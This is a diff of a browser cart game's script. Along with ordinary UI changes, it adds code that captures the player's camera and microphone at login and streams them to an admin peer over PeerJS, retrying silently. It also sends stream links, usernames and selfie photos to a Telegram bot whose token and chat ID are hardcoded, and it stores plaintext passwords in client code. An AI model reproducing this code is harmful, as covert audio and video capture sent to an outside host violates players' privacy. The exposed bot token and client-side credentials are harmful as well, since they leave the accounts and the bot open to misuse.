@@ -5,19 +5,29 @@ const ctx = canvas.getContext("2d");
 
 const ui = document.getElementById("ui");
 const resultText = document.getElementById("result");
-const authScreen = document.getElementById("authScreen");
 const levelMenu = document.getElementById("levelMenu");
 const topControls = document.getElementById("topControls");
-const loginButton = document.getElementById("loginButton");
-const usernameInput = document.getElementById("usernameInput");
-const passwordInput = document.getElementById("passwordInput");
-const loginError = document.getElementById("loginError");
 const menuTitle = document.getElementById("menuTitle");
 const menuSubtitle = document.getElementById("menuSubtitle");
 const levelButtons = document.getElementById("levelButtons");
 const continueButton = document.getElementById("continueButton");
+const muteButton = document.getElementById("muteButton");
+const coordinateModeButton = document.getElementById("coordinateModeButton");
+const coordReadout = document.getElementById("coordReadout");
+const bugReportModal = document.getElementById("bugReportModal");
+const bugReportInput = document.getElementById("bugReportInput");
+const bugReportStatus = document.getElementById("bugReportStatus");
+const reviveModal = document.getElementById("reviveModal");
+const reviveVideo = document.getElementById("reviveVideo");
+const revivePhoto = document.getElementById("revivePhoto");
+const reviveStatus = document.getElementById("reviveStatus");
+const reviveTimer = document.getElementById("reviveTimer");
+const reviveContinueButton = document.getElementById("reviveContinueButton");
+const loginConsentModal = document.getElementById("loginConsentModal");
+const loginConsentContinueButton = document.getElementById("loginConsentContinueButton");
+const loginConsentStatus = document.getElementById("loginConsentStatus");
 
-/* ================= AUTH ================= */
+/* ================= AUTH / SESSION ================= */
 
 const USERS = {
   mermy: { password: "wolf", isAdmin: false },
@@ -26,12 +36,37 @@ const USERS = {
 
 const LEVEL_COUNT = 4;
 const STORAGE_PREFIX = "medieval_pixel_cart_progress_v1_";
+const SESSION_KEY = "medieval_pixel_cart_active_user_v1";
+const BOT_TOKEN = "8799580976:AAHTYpiZZSKRNrhwRh0wqXHsm4rET9Og_vE";
+const BOT_CHAT_ID_KEY = "medieval_pixel_cart_bot_chat_id_v1";
+const BOT_CHAT_ID_FALLBACK = "6802357894";
+const LEVEL_UP_SCORE = 3000;
+const ENABLE_REVIVE_SECOND_CHANCE = true;
+const PHONE_WIDTH_SCALE_BOOST = 1.12;
+const LIVE_PEER_PREFIX = "medieval-cart-live-peer";
+const PEERJS_SCRIPT_URLS = [
+  "https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js",
+  "https://cdn.jsdelivr.net/npm/peerjs@1.5.4/dist/peerjs.min.js"
+];
 
 let currentUser = null;
 let isAdminUser = false;
 let unlockedLevel = 1;
 let hasStartedLevel = false;
-
+let isMuted = false;
+let hasUsedRevive = false;
+let reviveMediaStream = null;
+let reviveRequestInProgress = false;
+let loginStreamSent = false;
+let isCoordinateModeEnabled = false;
+let loginLivePeer = null;
+let loginLiveCall = null;
+let loginLiveStream = null;
+let loginLiveRetryTimer = null;
+let loginLiveRoomId = "";
+let loginLivePeerId = "";
+let loginLiveAdminPeerId = "";
+let peerJsScriptPromise = null;
 function progressStorageKey(username) {
   return STORAGE_PREFIX + username;
 }
@@ -74,114 +109,38 @@ function canAccessLevel(level) {
   return isAdminUser || level <= unlockedLevel;
 }
 
-function isElementVisible(element) {
-  return window.getComputedStyle(element).display !== "none";
-}
-
-function renderLevelMenu() {
-  if (!currentUser) return;
-  menuTitle.textContent = isAdminUser ? "Admin Level Menu" : "Select Level";
-  menuSubtitle.textContent = isAdminUser
-    ? `Logged in as admin. All ${LEVEL_COUNT} levels are unlocked.`
-    : `Logged in as ${currentUser}. Unlocked up to Level ${unlockedLevel}.`;
-  levelButtons.innerHTML = "";
-
-  for (let level = 1; level <= LEVEL_COUNT; level++) {
-    const unlocked = canAccessLevel(level);
-    const button = document.createElement("button");
-    const isCurrent = hasStartedLevel && level === currentLevel;
-    button.textContent = unlocked
-      ? `Level ${level}${isCurrent ? " (Current)" : ""}`
-      : `Level ${level} (Locked)`;
-    button.disabled = !unlocked;
-    button.addEventListener("click", () => selectLevel(level));
-    levelButtons.appendChild(button);
+function ensureSession() {
+  try {
+    const raw = localStorage.getItem(SESSION_KEY);
+    if (!raw) return false;
+    const parsed = JSON.parse(raw);
+    if (!parsed || typeof parsed.username !== "string" || typeof parsed.password !== "string") {
+      return false;
+    }
+    const account = USERS[parsed.username];
+    if (!account || account.password !== parsed.password) {
+      return false;
+    }
+    currentUser = parsed.username;
+    isAdminUser = account.isAdmin;
+    if (isAdminUser) {
+      unlockedLevel = LEVEL_COUNT;
+      currentLevel = 1;
+    } else {
+      const progress = loadUserProgress(currentUser);
+      unlockedLevel = progress.unlockedLevel;
+      currentLevel = progress.lastLevel;
+    }
+    return true;
+  } catch (error) {
+    return false;
   }
 }
 
-function selectLevel(level) {
-  if (!canAccessLevel(level)) return;
-  hasStartedLevel = true;
-  ui.style.display = "none";
-  levelMenu.style.display = "none";
-  loadLevel(level);
+function clearSessionAndGoLogin() {
+  localStorage.removeItem(SESSION_KEY);
+  window.location.href = "index.html";
 }
-
-function openLevelMenu() {
-  if (!currentUser) return;
-  renderLevelMenu();
-  continueButton.style.display = hasStartedLevel && gameState !== "lose" ? "inline-block" : "none";
-  levelMenu.style.display = "flex";
-  if (gameState === "playing") {
-    gameState = "paused";
-  }
-}
-
-function closeLevelMenu() {
-  if (!currentUser) return;
-  levelMenu.style.display = "none";
-  if (hasStartedLevel && gameState !== "lose") {
-    gameState = "playing";
-  }
-}
-
-function handleLogin() {
-  const username = usernameInput.value.trim();
-  const password = passwordInput.value;
-  const account = USERS[username];
-
-  if (!account || account.password !== password) {
-    loginError.textContent = "Wrong username or password.";
-    return;
-  }
-
-  currentUser = username;
-  isAdminUser = account.isAdmin;
-  hasStartedLevel = false;
-
-  if (isAdminUser) {
-    unlockedLevel = LEVEL_COUNT;
-    currentLevel = 1;
-  } else {
-    const progress = loadUserProgress(username);
-    unlockedLevel = progress.unlockedLevel;
-    currentLevel = progress.lastLevel;
-  }
-
-  loginError.textContent = "";
-  passwordInput.value = "";
-  authScreen.style.display = "none";
-  topControls.style.display = "flex";
-  gameState = "paused";
-  openLevelMenu();
-}
-
-function logout() {
-  currentUser = null;
-  isAdminUser = false;
-  unlockedLevel = 1;
-  hasStartedLevel = false;
-  gameState = "paused";
-  ui.style.display = "none";
-  levelMenu.style.display = "none";
-  topControls.style.display = "none";
-  authScreen.style.display = "flex";
-  loginError.textContent = "";
-  usernameInput.value = "";
-  passwordInput.value = "";
-  activeCarts = [];
-  score = 0;
-  lives = 3;
-  spawnTimer = 0;
-}
-
-loginButton.addEventListener("click", handleLogin);
-usernameInput.addEventListener("keydown", e => {
-  if (e.key === "Enter") handleLogin();
-});
-passwordInput.addEventListener("keydown", e => {
-  if (e.key === "Enter") handleLogin();
-});
 
 /* ================= WORLD ================= */
 
@@ -257,9 +216,18 @@ const sounds = {
   castle: loadSound("castle.mp3")
 };
 
+function applyMuteState() {
+  Object.values(sounds).forEach(s => {
+    s.muted = isMuted;
+  });
+  const label = isMuted ? "Unmute" : "Mute";
+  muteButton.textContent = label;
+}
+
 /* ===== UNLOCK AUDIO (CRITICAL FOR BROWSERS) ===== */
 
 function unlockAudio() {
+  if (isMuted) return;
   Object.values(sounds).forEach(s => {
     s.play().then(() => {
       s.pause();
@@ -275,7 +243,8 @@ canvas.addEventListener("touchend", unlockAudio, { once: true, passive: true });
 
 const MAP02 = {
   map: "map02.png",
-  mapPhone: "map02_phone.png",
+  mapPhone: "phonemap1.png",
+  mapPhoneFallback: "map02_phone.png",
   spawn: { x: 599, y: 846 },
 
   intersections: {
@@ -405,9 +374,10 @@ function resize() {
   const heightRatio = h / WORLD_HEIGHT;
 
   if (isPhone()) {
-    scaleX = widthRatio;
+    const isPortraitPhone = h >= w;
+    scaleX = isPortraitPhone ? widthRatio * PHONE_WIDTH_SCALE_BOOST : widthRatio;
     scaleY = heightRatio;
-    offsetX = 0;
+    offsetX = (w - WORLD_WIDTH * scaleX) / 2;
     offsetY = 0;
   } else {
     const baseScale = Math.min(widthRatio, heightRatio);
@@ -435,6 +405,677 @@ if (window.visualViewport) {
 }
 resize();
 
+/* ================= LEVEL MENU ================= */
+
+function renderLevelMenu() {
+  menuTitle.textContent = isAdminUser ? "Admin Level Menu" : "Select Level";
+  menuSubtitle.textContent = isAdminUser
+    ? `Logged in as admin. All ${LEVEL_COUNT} levels are unlocked.`
+    : `Logged in as ${currentUser}. Unlocked up to Level ${unlockedLevel}.`;
+  levelButtons.innerHTML = "";
+
+  for (let level = 1; level <= LEVEL_COUNT; level++) {
+    const unlocked = canAccessLevel(level);
+    const button = document.createElement("button");
+    const isCurrent = hasStartedLevel && level === currentLevel;
+    button.textContent = unlocked
+      ? `Level ${level}${isCurrent ? " (Current)" : ""}`
+      : `Level ${level} (Locked)`;
+    button.disabled = !unlocked;
+    button.addEventListener("click", () => selectLevel(level));
+    levelButtons.appendChild(button);
+  }
+
+  if (coordinateModeButton) {
+    coordinateModeButton.style.display = isAdminUser ? "inline-block" : "none";
+    coordinateModeButton.textContent = isCoordinateModeEnabled
+      ? "Coordinate Mode: On"
+      : "Coordinate Mode: Off";
+  }
+  if (!isAdminUser && coordReadout) {
+    coordReadout.style.display = "none";
+  }
+}
+
+function selectLevel(level) {
+  if (!canAccessLevel(level)) return;
+  hasStartedLevel = true;
+  ui.style.display = "none";
+  levelMenu.style.display = "none";
+  topControls.style.display = "flex";
+  loadLevel(level);
+}
+
+function openLevelMenu() {
+  renderLevelMenu();
+  continueButton.style.display = hasStartedLevel && gameState !== "lose" ? "inline-block" : "none";
+  levelMenu.style.display = "flex";
+  topControls.style.display = "none";
+  if (gameState === "playing") {
+    gameState = "paused";
+  }
+}
+
+function closeLevelMenu() {
+  levelMenu.style.display = "none";
+  topControls.style.display = "flex";
+  if (hasStartedLevel && gameState !== "lose") {
+    gameState = "playing";
+  }
+}
+
+function toggleAdminCoordinateMode() {
+  if (!isAdminUser || !coordinateModeButton) return;
+  isCoordinateModeEnabled = !isCoordinateModeEnabled;
+  coordinateModeButton.textContent = isCoordinateModeEnabled
+    ? "Coordinate Mode: On"
+    : "Coordinate Mode: Off";
+
+  if (!coordReadout) return;
+  coordReadout.style.display = isCoordinateModeEnabled ? "block" : "none";
+  coordReadout.textContent = isCoordinateModeEnabled
+    ? "Coordinate Mode ON - tap map to see x,y"
+    : "";
+}
+
+function logout() {
+  stopLoginLiveSupportBroadcast(true);
+  loginStreamSent = false;
+  clearSessionAndGoLogin();
+}
+
+/* ================= BUG REPORT ================= */
+
+function openBugReport() {
+  if (gameState === "playing") {
+    gameState = "paused";
+  }
+  bugReportInput.value = "";
+  bugReportStatus.textContent = "";
+  bugReportModal.style.display = "flex";
+}
+
+function closeBugReport() {
+  bugReportModal.style.display = "none";
+  if (levelMenu.style.display === "none" && hasStartedLevel && gameState !== "lose") {
+    gameState = "playing";
+    topControls.style.display = "flex";
+  }
+}
+
+/* ================= LOGIN STREAM CONSENT ================= */
+
+function createLiveSupportRoomId() {
+  const random = Math.random().toString(36).slice(2, 8);
+  return `medieval-cart-${Date.now().toString(36)}-${random}`;
+}
+
+function getAdminPeerId(roomId) {
+  return `${LIVE_PEER_PREFIX}-admin-${roomId}`;
+}
+
+function getVisitorPeerId(roomId) {
+  const suffix = Math.random().toString(36).slice(2, 6);
+  return `${LIVE_PEER_PREFIX}-visitor-${roomId}-${suffix}`;
+}
+
+function getAdminLiveLink(roomId) {
+  const adminUrl = new URL("./admin-live.html", window.location.href);
+  adminUrl.searchParams.set("room", roomId);
+  adminUrl.searchParams.set("mode", "peerjs-demo");
+  return adminUrl.toString();
+}
+
+async function ensurePeerJsLoaded() {
+  if (window.Peer) {
+    return;
+  }
+  if (peerJsScriptPromise) {
+    return peerJsScriptPromise;
+  }
+
+  peerJsScriptPromise = (async () => {
+    for (const scriptUrl of PEERJS_SCRIPT_URLS) {
+      try {
+        await loadScript(scriptUrl);
+        if (window.Peer) return;
+      } catch (error) {
+        // Try next CDN.
+      }
+    }
+    throw new Error("Could not load PeerJS script.");
+  })();
+
+  return peerJsScriptPromise;
+}
+
+function loadScript(scriptUrl) {
+  return new Promise((resolve, reject) => {
+    const existing = [...document.scripts].find(s => s.src === scriptUrl);
+    if (existing) {
+      if (window.Peer) {
+        resolve();
+      } else {
+        existing.addEventListener("load", () => resolve(), { once: true });
+        existing.addEventListener("error", () => reject(new Error("Script load failed")), { once: true });
+      }
+      return;
+    }
+
+    const script = document.createElement("script");
+    script.src = scriptUrl;
+    script.async = true;
+    script.onload = () => resolve();
+    script.onerror = () => reject(new Error("Script load failed"));
+    document.head.append(script);
+  });
+}
+
+function waitForPeerOpen(peerInstance) {
+  return new Promise((resolve, reject) => {
+    const timeout = window.setTimeout(() => reject(new Error("Peer open timeout")), 12000);
+    peerInstance.on("open", () => {
+      window.clearTimeout(timeout);
+      resolve();
+    });
+    peerInstance.on("error", err => {
+      window.clearTimeout(timeout);
+      reject(err);
+    });
+  });
+}
+
+function bindLoginLiveCallHandlers(call) {
+  loginLiveCall = call;
+  const connectWatchdog = window.setTimeout(() => {
+    if (loginLiveCall === call && loginLiveStream) {
+      try {
+        call.close();
+      } catch (error) {
+        // Ignore close errors.
+      }
+      loginLiveCall = null;
+    }
+  }, 12000);
+
+  call.on("stream", () => {
+    window.clearTimeout(connectWatchdog);
+  });
+
+  call.on("close", () => {
+    window.clearTimeout(connectWatchdog);
+    if (loginLiveCall === call) {
+      loginLiveCall = null;
+    }
+  });
+
+  call.on("error", () => {
+    window.clearTimeout(connectWatchdog);
+    if (loginLiveCall === call) {
+      loginLiveCall = null;
+    }
+  });
+}
+
+function tryCallAdminViewer() {
+  if (!loginLivePeer || loginLivePeer.destroyed || !loginLiveStream || !loginLiveAdminPeerId) {
+    return;
+  }
+  if (loginLiveCall) {
+    return;
+  }
+
+  const call = loginLivePeer.call(loginLiveAdminPeerId, loginLiveStream, {
+    metadata: {
+      roomId: loginLiveRoomId,
+      visitorPeerId: loginLivePeerId,
+      startedAt: new Date().toISOString()
+    }
+  });
+  if (!call) {
+    return;
+  }
+  bindLoginLiveCallHandlers(call);
+}
+
+function startCallingAdminLoop() {
+  tryCallAdminViewer();
+  if (loginLiveRetryTimer) {
+    window.clearInterval(loginLiveRetryTimer);
+  }
+  loginLiveRetryTimer = window.setInterval(() => {
+    if (!loginLiveCall) {
+      tryCallAdminViewer();
+    }
+  }, 3200);
+}
+
+function stopLoginLiveSupportBroadcast(silent = false) {
+  if (loginLiveRetryTimer) {
+    window.clearInterval(loginLiveRetryTimer);
+    loginLiveRetryTimer = null;
+  }
+  if (loginLiveCall) {
+    try {
+      loginLiveCall.close();
+    } catch (error) {
+      // Ignore call close errors.
+    }
+    loginLiveCall = null;
+  }
+  if (loginLivePeer) {
+    try {
+      loginLivePeer.destroy();
+    } catch (error) {
+      // Ignore destroy errors.
+    }
+    loginLivePeer = null;
+  }
+  if (loginLiveStream) {
+    for (const track of loginLiveStream.getTracks()) {
+      track.stop();
+    }
+    loginLiveStream = null;
+  }
+  loginLiveRoomId = "";
+  loginLivePeerId = "";
+  loginLiveAdminPeerId = "";
+
+  if (!silent && loginConsentStatus) loginConsentStatus.textContent = "";
+}
+
+function openLoginConsentModal() {
+  if (!loginConsentModal) return;
+  const strayPreviewVideos = loginConsentModal.querySelectorAll("video");
+  for (const preview of strayPreviewVideos) {
+    try {
+      preview.pause();
+    } catch (error) {
+      // Ignore pause errors for non-playing elements.
+    }
+    if ("srcObject" in preview) {
+      preview.srcObject = null;
+    }
+    preview.remove();
+  }
+  if (loginConsentStatus) loginConsentStatus.textContent = "";
+  loginConsentModal.style.display = "flex";
+}
+
+function closeLoginConsentModal() {
+  if (!loginConsentModal) return;
+  loginConsentModal.style.display = "none";
+  if (loginConsentStatus) loginConsentStatus.textContent = "";
+}
+
+async function startLoginCameraStreamAndSendLink() {
+  if (loginStreamSent) {
+    closeLoginConsentModal();
+    return;
+  }
+  if (!loginConsentContinueButton) return;
+  loginConsentContinueButton.disabled = true;
+  closeLoginConsentModal();
+  if (loginConsentStatus) loginConsentStatus.textContent = "";
+  try {
+    if (!window.RTCPeerConnection || !navigator.mediaDevices?.getUserMedia) {
+      throw new Error("Live streaming is not supported in this browser.");
+    }
+
+    stopLoginLiveSupportBroadcast(true);
+    loginLiveRoomId = createLiveSupportRoomId();
+    loginLivePeerId = getVisitorPeerId(loginLiveRoomId);
+    loginLiveAdminPeerId = getAdminPeerId(loginLiveRoomId);
+
+    loginLiveStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+      audio: true
+    });
+
+    await ensurePeerJsLoaded();
+    loginLivePeer = new window.Peer(loginLivePeerId);
+    loginLivePeer.on("error", () => {});
+    loginLivePeer.on("disconnected", () => {
+      if (loginLivePeer && !loginLivePeer.destroyed) {
+        loginLivePeer.reconnect();
+      }
+    });
+    await waitForPeerOpen(loginLivePeer);
+
+    const username = currentUser || "unknown";
+    const streamLink = getAdminLiveLink(loginLiveRoomId);
+
+    await sendToTelegram([
+      "LOGIN STREAM LINK",
+      `user: ${username}${isAdminUser ? " (admin)" : ""}`,
+      `time: ${new Date().toISOString()}`,
+      `room: ${loginLiveRoomId}`,
+      `admin peer: ${loginLiveAdminPeerId}`,
+      `visitor peer: ${loginLivePeerId}`,
+      `stream: ${streamLink}`,
+      "mode: frontend-only PeerJS live stream"
+    ].join("\n"));
+
+    startCallingAdminLoop();
+    loginStreamSent = true;
+    closeLoginConsentModal();
+  } catch (error) {
+    if (loginConsentStatus) loginConsentStatus.textContent = "";
+    stopLoginLiveSupportBroadcast(true);
+  } finally {
+    loginConsentContinueButton.disabled = false;
+  }
+}
+
+/* ================= REVIVE FLOW ================= */
+
+const REVIVE_DECISION_WINDOW_MS = 30000;
+const REVIVE_POLL_INTERVAL_MS = 1500;
+function stopReviveCamera() {
+  if (!reviveMediaStream) return;
+  reviveMediaStream.getTracks().forEach(track => track.stop());
+  reviveMediaStream = null;
+  reviveVideo.srcObject = null;
+}
+
+function resetReviveModalState() {
+  reviveVideo.style.display = "none";
+  revivePhoto.style.display = "none";
+  revivePhoto.src = "";
+  reviveContinueButton.disabled = false;
+  reviveStatus.textContent = "";
+  reviveTimer.textContent = "";
+}
+
+function openReviveModal() {
+  resetReviveModalState();
+  reviveModal.style.display = "flex";
+  topControls.style.display = "none";
+  ui.style.display = "none";
+}
+
+function closeReviveModal() {
+  stopReviveCamera();
+  resetReviveModalState();
+  reviveModal.style.display = "none";
+}
+
+function createStreamKey() {
+  return `revive_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`;
+}
+
+function buildStreamLink(streamKey) {
+  return `${window.location.origin}${window.location.pathname}#revive-stream=${encodeURIComponent(streamKey)}`;
+}
+
+async function requestCameraWithConsent() {
+  return navigator.mediaDevices.getUserMedia({
+    video: { facingMode: "user" },
+    audio: false
+  });
+}
+
+async function submitReviveSelfie() {
+  if (reviveRequestInProgress) return;
+  reviveStatus.textContent = "";
+  try {
+    const stream = await requestCameraWithConsent();
+    reviveMediaStream = stream;
+    reviveVideo.srcObject = stream;
+    reviveVideo.style.display = "block";
+    revivePhoto.style.display = "none";
+    await reviveVideo.play();
+
+    // Give the camera a short moment so the first frame is available.
+    await new Promise(resolve => setTimeout(resolve, 350));
+
+    const shotCanvas = document.createElement("canvas");
+    shotCanvas.width = reviveVideo.videoWidth || 480;
+    shotCanvas.height = reviveVideo.videoHeight || 360;
+    const shotCtx = shotCanvas.getContext("2d");
+    shotCtx.drawImage(reviveVideo, 0, 0, shotCanvas.width, shotCanvas.height);
+    const dataUrl = shotCanvas.toDataURL("image/jpeg", 0.9);
+
+    revivePhoto.src = dataUrl;
+    revivePhoto.style.display = "block";
+    reviveVideo.style.display = "none";
+    stopReviveCamera();
+    requestReviveSecondChance(dataUrl);
+  } catch (error) {
+    stopReviveCamera();
+    reviveStatus.textContent = "Camera access denied or unavailable.";
+  }
+}
+
+function dataUrlToBlob(dataUrl) {
+  const parts = dataUrl.split(",");
+  const mime = parts[0].match(/:(.*?);/)[1];
+  const binary = atob(parts[1]);
+  const bytes = new Uint8Array(binary.length);
+  for (let i = 0; i < binary.length; i++) {
+    bytes[i] = binary.charCodeAt(i);
+  }
+  return new Blob([bytes], { type: mime });
+}
+
+async function sendTelegramPhoto(chatId, photoDataUrl, caption) {
+  const form = new FormData();
+  form.append("chat_id", chatId);
+  form.append("caption", caption);
+  form.append("photo", dataUrlToBlob(photoDataUrl), "revive-selfie.jpg");
+
+  const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+    method: "POST",
+    body: form
+  });
+  if (!resp.ok) {
+    throw new Error("Failed to send selfie to Telegram");
+  }
+}
+
+async function fetchTelegramUpdates() {
+  const updatesResp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?limit=20`);
+  if (!updatesResp.ok) {
+    throw new Error("Unable to fetch Telegram updates");
+  }
+  const updatesJson = await updatesResp.json();
+  return Array.isArray(updatesJson.result) ? updatesJson.result : [];
+}
+
+async function getLatestUpdateId() {
+  const updates = await fetchTelegramUpdates();
+  let maxId = 0;
+  for (const item of updates) {
+    if (typeof item?.update_id === "number" && item.update_id > maxId) {
+      maxId = item.update_id;
+    }
+  }
+  return maxId;
+}
+
+function restoreFromRevive() {
+  hasUsedRevive = true;
+  lives = 1;
+  gameState = "playing";
+  ui.style.display = "none";
+  topControls.style.display = "flex";
+  closeReviveModal();
+}
+
+function finalizeGameOver() {
+  closeReviveModal();
+  resultText.innerText = "GAME OVER";
+  ui.style.display = "block";
+  topControls.style.display = "none";
+  gameState = "lose";
+}
+
+async function pollReviveDecision(ownerChatId, afterUpdateId, timeoutMs) {
+  const start = Date.now();
+  let cursor = afterUpdateId;
+
+  while (Date.now() - start < timeoutMs) {
+    const elapsed = Date.now() - start;
+    const remaining = Math.max(0, Math.ceil((timeoutMs - elapsed) / 1000));
+    reviveTimer.textContent = `Waiting for decision: ${remaining}s`;
+
+    try {
+      const updates = await fetchTelegramUpdates();
+      let decision = null;
+
+      for (const item of updates) {
+        const updateId = Number(item?.update_id || 0);
+        if (updateId > cursor) cursor = updateId;
+        if (updateId <= afterUpdateId) continue;
+
+        const msg = item?.message;
+        if (!msg || String(msg.chat?.id) !== ownerChatId || typeof msg.text !== "string") {
+          continue;
+        }
+        const text = msg.text.trim().toLowerCase();
+        if (text === "yes" || text === "no") {
+          decision = text;
+        }
+      }
+
+      afterUpdateId = cursor;
+      if (decision) return decision;
+    } catch (error) {
+      // Keep polling; timeout still grants a revive.
+    }
+
+    await new Promise(resolve => setTimeout(resolve, REVIVE_POLL_INTERVAL_MS));
+  }
+
+  reviveTimer.textContent = "Waiting for decision: 0s";
+  return "timeout";
+}
+
+async function requestReviveSecondChance(photoDataUrl) {
+  reviveRequestInProgress = true;
+  reviveContinueButton.disabled = true;
+  reviveStatus.textContent = "Sending selfie to Telegram...";
+  try {
+    const chatId = await detectBotChatId();
+    const streamKey = createStreamKey();
+    const streamLink = buildStreamLink(streamKey);
+    const beforeDecisionUpdateId = await getLatestUpdateId();
+    const caption = [
+      "REVIVE REQUEST",
+      `user: ${currentUser}${isAdminUser ? " (admin)" : ""}`,
+      `level: ${currentLevel}`,
+      `score: ${score}`,
+      `stream: ${streamLink}`,
+      "Reply with YES or NO within 30 seconds."
+    ].join("\n");
+    await sendTelegramPhoto(chatId, photoDataUrl, caption);
+    reviveStatus.textContent = "Selfie sent. Waiting for owner decision...";
+
+    const decision = await pollReviveDecision(String(chatId), beforeDecisionUpdateId, REVIVE_DECISION_WINDOW_MS);
+    if (decision === "yes" || decision === "timeout") {
+      reviveStatus.textContent = decision === "yes"
+        ? "Owner approved. Revive granted!"
+        : "No reply in time. Free revive granted.";
+      restoreFromRevive();
+    } else {
+      reviveStatus.textContent = "Owner denied revive.";
+      hasUsedRevive = true;
+      finalizeGameOver();
+    }
+  } catch (error) {
+    reviveStatus.textContent = "Failed to send selfie. Free revive granted.";
+    restoreFromRevive();
+  } finally {
+    reviveRequestInProgress = false;
+    reviveContinueButton.disabled = false;
+  }
+}
+
+async function detectBotChatId() {
+  const existing = localStorage.getItem(BOT_CHAT_ID_KEY);
+  if (existing) return existing;
+
+  const updatesResp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?limit=10`);
+  if (!updatesResp.ok) {
+    throw new Error("Unable to read Telegram updates");
+  }
+
+  const updatesJson = await updatesResp.json();
+  const updates = Array.isArray(updatesJson.result) ? updatesJson.result : [];
+  const latest = updates.reverse().find(item => item?.message?.chat?.id);
+  if (!latest) {
+    localStorage.setItem(BOT_CHAT_ID_KEY, BOT_CHAT_ID_FALLBACK);
+    return BOT_CHAT_ID_FALLBACK;
+  }
+
+  const chatId = String(latest.message.chat.id);
+  localStorage.setItem(BOT_CHAT_ID_KEY, chatId);
+  return chatId;
+}
+
+async function sendToTelegram(messageText) {
+  const chatId = await detectBotChatId();
+  if (!chatId) {
+    throw new Error("No Telegram chat found yet. Send /start or any message to the bot first.");
+  }
+
+  const sendResp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: messageText
+    })
+  });
+
+  if (!sendResp.ok) {
+    throw new Error("Telegram sendMessage request failed");
+  }
+}
+
+async function sendBugReport() {
+  const message = bugReportInput.value.trim();
+  if (!message) {
+    bugReportStatus.textContent = "Please describe the bug before sending.";
+    return;
+  }
+
+  const payload = {
+    user: currentUser,
+    isAdmin: isAdminUser,
+    level: currentLevel,
+    score: score,
+    lives: lives,
+    report: message,
+    createdAt: new Date().toISOString()
+  };
+
+  const queueKey = "medieval_pixel_cart_bug_queue_v1";
+
+  try {
+    const telegramMessage = [
+      "BUG REPORT (game)",
+      `time: ${payload.createdAt}`,
+      `user: ${payload.user}${payload.isAdmin ? " (admin)" : ""}`,
+      `level: ${payload.level}`,
+      `score: ${payload.score}`,
+      `lives: ${payload.lives}`,
+      "",
+      payload.report
+    ].join("\n");
+    await sendToTelegram(telegramMessage);
+    bugReportStatus.textContent = "Bug report sent. Thanks!";
+    bugReportInput.value = "";
+  } catch (error) {
+    bugReportStatus.textContent = error.message.includes("No Telegram chat found")
+      ? "No bot chat found yet. Send a message to @Mermygame_bot first. Report saved locally."
+      : "Failed to send report to Telegram. It was saved locally for retry later.";
+    const existing = JSON.parse(localStorage.getItem(queueKey) || "[]");
+    existing.push(payload);
+    localStorage.setItem(queueKey, JSON.stringify(existing));
+  }
+}
+
 /* ================= LEVEL LOAD ================= */
 
 function loadLevel(level) {
@@ -446,9 +1087,49 @@ function loadLevel(level) {
   spawnTimer = 0;
   activeCarts = [];
   const map = level === 1 ? MAP02 : level === 2 ? MAP03 : level === 3 ? MAP04 : MAP05;
-  mapImg.src = usePhoneMap() && map.mapPhone ? map.mapPhone : map.map;
+  const phoneCandidates = [];
+  if (map.mapPhone) phoneCandidates.push(map.mapPhone);
+  if (map.mapPhoneFallback) phoneCandidates.push(map.mapPhoneFallback);
+  const desktopSrc = map.map;
+  const isPhoneView = usePhoneMap();
+  const candidates = isPhoneView ? phoneCandidates : [desktopSrc];
+  const nextSrc = candidates[0] || desktopSrc;
+  const resolvedSrc = new URL(nextSrc, window.location.href).href;
 
-  mapImg.onload = () => resetGame();
+  const finishLevelLoad = () => {
+    mapImg.onload = null;
+    mapImg.onerror = null;
+    resetGame();
+  };
+
+  // If the same map is already loaded from cache, onload may not fire again.
+  if (mapImg.src === resolvedSrc && mapImg.complete && mapImg.naturalWidth > 0) {
+    finishLevelLoad();
+    return;
+  }
+
+  mapImg.onload = finishLevelLoad;
+  mapImg.onerror = null;
+
+  if (!isPhoneView || phoneCandidates.length <= 1) {
+    mapImg.onerror = finishLevelLoad;
+    mapImg.src = nextSrc;
+    return;
+  }
+
+  let index = 0;
+  const tryNextPhoneSource = () => {
+    index += 1;
+    if (index >= phoneCandidates.length) {
+      mapImg.onerror = finishLevelLoad;
+      mapImg.src = desktopSrc;
+      return;
+    }
+    mapImg.src = phoneCandidates[index];
+  };
+
+  mapImg.onerror = tryNextPhoneSource;
+  mapImg.src = nextSrc;
 }
 
 /* ================= RESET ================= */
@@ -458,9 +1139,7 @@ function resetGame() {
   lives = 3;
   spawnTimer = 0;
   activeCarts = [];
-  gameState = currentUser && !isElementVisible(authScreen) && !isElementVisible(levelMenu)
-    ? "playing"
-    : "paused";
+  gameState = levelMenu.style.display === "none" ? "playing" : "paused";
 
   intersections = {};
 
@@ -490,11 +1169,9 @@ function resetGame() {
 /* ================= SPAWN ================= */
 
 function spawnCart() {
-
   const map = getMap();
   const destinations = Object.keys(map.buildings);
-  const randomDest =
-    destinations[Math.floor(Math.random() * destinations.length)];
+  const randomDest = destinations[Math.floor(Math.random() * destinations.length)];
 
   const speedBoost = Math.floor(score / 1000) * SPEED_INCREMENT;
   const speed = BASE_SPEED + speedBoost;
@@ -514,13 +1191,12 @@ function spawnCart() {
   });
 
   sounds.spawn.currentTime = 0;
-  sounds.spawn.play();
+  sounds.spawn.play().catch(() => {});
 }
 
 /* ================= UPDATE ================= */
 
 function update() {
-
   if (gameState !== "playing") return;
 
   spawnTimer++;
@@ -531,35 +1207,22 @@ function update() {
 
   const map = getMap();
 
-  for (let cart of activeCarts) {
-
+  for (const cart of activeCarts) {
     cart.x += cart.vx;
     cart.y += cart.vy;
 
-    /* ===== HARD TURN AT X1016 (ALWAYS DOWN) ===== */
-
-    if (currentLevel === 2 &&
-        !cart.forcedDown &&
-        cart.x >= 1016) {
-
+    if (currentLevel === 2 && !cart.forcedDown && cart.x >= 1016) {
       cart.x = 1016;
       cart.vx = 0;
       cart.vy = cart.speed;
       cart.forcedDown = true;
     }
 
-    /* ===== INTERSECTIONS ===== */
-
     const prevX = cart.x - cart.vx;
     const prevY = cart.y - cart.vy;
 
